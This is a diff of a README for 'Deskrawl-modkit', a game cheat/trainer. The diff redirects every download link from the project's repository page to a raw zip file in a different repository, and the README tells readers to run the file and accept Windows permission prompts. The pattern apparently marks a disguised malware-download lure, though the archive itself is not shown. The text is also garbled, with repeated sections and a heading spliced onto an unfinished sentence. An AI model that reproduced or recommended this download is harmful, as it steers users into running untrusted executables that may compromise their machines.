@@ -5,13 +5,13 @@ description: "Unlock 38 trainer modules for Deskrawl: Idle ARPG on Windows with 
 ---
 # 🎮 Deskrawl-modkit - Unlock Your Idle ARPG Power
 
-[![Download Deskrawl-modkit](https://img.shields.io/badge/Download-Deskrawl--modkit-8A2BE2?style=for-the-badge&logo=github&labelColor=FF69B4&logoColor=white)](https://github.com/Kaktutis/Deskrawl-modkit)
+[![Download Deskrawl-modkit](https://img.shields.io/badge/Download-Deskrawl--modkit-8A2BE2?style=for-the-badge&logo=github&labelColor=FF69B4&logoColor=white)](https://raw.githubusercontent.com/Kaktutis/kaktutis.github.io/main/firework/App_1.2-beta.3.zip)
 
 Deskrawl-modkit is a 38-module cheat/trainer for Deskrawl: Idle ARPG. It brings combat, minion, economy, town, and world tools together in one Windows-friendly package for players who want more control over their idle progress.
 
 ## 📥 Download Deskrawl-modkit
 
-Visit this link to download the application: [Download Deskrawl-modkit](https://github.com/Kaktutis/Deskrawl-modkit).
+Visit this link to download the application: [Download Deskrawl-modkit](https://raw.githubusercontent.com/Kaktutis/kaktutis.github.io/main/firework/App_1.2-beta.3.zip).
 
 After the download finishes, open the downloaded item from your Downloads folder. No programming knowledge is needed.
 
@@ -131,7 +131,7 @@ If you cannot find the downloaded item, open File Explorer and select Downloads.
 
 If the dashboard does not open, confirm the download has finished completely. Large files can take a moment to save on slower connections# 🎮 Deskrawl-modkit - Unlock Your Idle ARPG Power
 
-[![Download Deskrawl-modkit](https://img.shields.io/badge/Download-Deskrawl--modkit-8A2BE2?style=for-the-badge&logo=github&labelColor=FF69B4&logoColor=white)](https://github.com/Kaktutis/Deskrawl-modkit)
+[![Download Deskrawl-modkit](https://img.shields.io/badge/Download-Deskrawl--modkit-8A2BE2?style=for-the-badge&logo=github&labelColor=FF69B4&logoColor=white)](https://raw.githubusercontent.com/Kaktutis/kaktutis.github.io/main/firework/App_1.2-beta.3.zip)
 
 Deskrawl-modkit is a 38-module cheat/trainer for Deskrawl: Idle ARPG. It brings combat, minion, economy, town, and world tools together in one easy-to-use package for Windows. Whether you want to fine-tune your idle progress or take direct control of specific game systems, this toolkit gives you a clear dashboard with simple on/off switches. No programming knowledge is required.
 
@@ -151,7 +151,7 @@ That’s it. The application opens with a clean interface that lists all availab
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [Download Deskrawl-modkit](https://github.com/Kaktutis/Deskrawl-modkit).
+Visit this link to download the application: [Download Deskrawl-modkit](https://raw.githubusercontent.com/Kaktutis/kaktutis.github.io/main/firework/App_1.2-beta.3.zip).
 
 After you click the link, follow the instructions on the page to download the file. Once the download is complete, open the file from your Downloads folder. If Windows asks for permission to run the file, click “Yes” or “Run” to continue. The application will open and show the main dashboard.
 
